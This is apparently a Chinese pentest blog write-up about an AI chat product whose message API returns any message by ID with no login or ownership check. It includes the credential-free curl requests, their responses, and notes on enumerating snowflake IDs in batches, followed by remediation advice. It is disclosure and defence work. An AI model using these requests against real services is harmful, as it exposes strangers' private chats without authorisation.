---
title: "AI 对话产品消息接口未授权：拿到 message_id 就能读消息"
date: 2026-07-20 00:00:00
categories:
  - 渗透
tags:
  - 未授权访问
  - IDOR
  - API安全
description: "通过测试账号的消息 ID，对比消息查询接口及后端路径的鉴权行为，分析聊天消息未授权读取问题。"
cover: /images/pentest/chat-message-unauthorized-access.jpg
---

> 域名、产品名、message_id 已隐去；响应内容有裁剪。

## 背景

目标是一个 AI 对话产品的 web 端。消息接口按 ID 取内容，这类接口通常先试一下未授权访问。

## 获取 message_id

用测试账号 B 登录，发一条消息，内容里放一个固定标记 `probe-1784486629`，方便确认后续返回的是不是这一条。

打开开发者工具 Network，翻聊天相关请求，消息 ID 在返回结构里，是一串数字，长度固定，看着像雪花 ID。

## 不带凭证请求

```bash
API="https://<目标域名>/api/MGetMessages"
MID="<message_id>"

curl -sS -X POST "$API" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  --data "{\"message_ids\":[\"$MID\"]}" \
  -D headers.txt -o body.json \
  -w 'HTTP_STATUS=%{http_code}\n'
```

`HTTP_STATUS=200`。`headers.txt` 里主要是常规响应头：

```text
HTTP/2 200
content-type: application/json
```

`body.json`：

```json
{"code":0,"message":"success","data":{"messages":[
  {"id":"<message_id>","role":"user","content":"probe-1784486629"}
]}}
```

`data.messages[0].id` 与传入的 ID 一致，`content` 就是刚才发的那条消息。

## 确认请求没带凭证

用 `curl -v` 再发一次，请求头如下：

```text
> POST /api/MGetMessages HTTP/1.1
> Host: <目标域名>
> Content-Type: application/json
> Accept: application/json, text/plain, */*
```

没有 Cookie，也没有产品自己的登录 token 和 webid 头，只有 Content-Type 和 Accept。

## 换一条后端路径

第一次返回 200 时，先怀疑是网关放行了这条路由，或者消息被当成公开内容。这个产品是 BFF + gRPC，前端走 `/api/xxx`，网关再转到 `/<前缀>.<服务>/MGetMessages` 这类直连路径。换到直连路径再请求：

```bash
API2="https://<目标域名>/<网关前缀>.<服务名>/MGetMessages"

curl -sS -X POST "$API2" \
  -H 'Content-Type: application/json' \
  --data "{\"message_ids\":[\"$MID\"]}" \
  -o proto_body.json -w 'HTTP_STATUS=%{http_code}\n'
```

回显：

```json
{"code":0,"message":"success","data":{"messages":[
  {"id":"<message_id>","content":"probe-1784486629"}
]}}
```

两条路径都没有鉴权，可以排除网关配置问题。

## 影响

message_id 是雪花 ID，位数固定、时间戳在前，有递增趋势。接口按 ID 返回消息，不校验登录，也不校验归属。

`message_ids` 是数组，一次可以传多个 ID，接口没有频控。只要知道 ID 就能读任意用户的消息，不需要知道会话或用户信息。

返回内容包含消息正文、发送者、时间等字段，聊天里可能涉及个人隐私、工作内容、健康或财务信息。

## 修复

1. `/api/MGetMessages` 强制校验登录态；
2. 服务端校验每个 message_id 的归属（`user_id`、`chat_id`、`session_id`）；
3. 无权限和不存在的消息统一返回 403/404，不要用不同错误码区分；
4. 限制 `message_ids` 数组长度，加频控；
5. 同类接口（`GetChatMessages`、`PullChatMessagesByMessageID`、`ShareChatMessages`）一起检查。

---

## 验证截图

![消息查询结果与测试标记验证](/images/pentest/chat-message-proof.png)

![后端路径的消息查询对照回显](/images/pentest/chat-backend-proof.png)
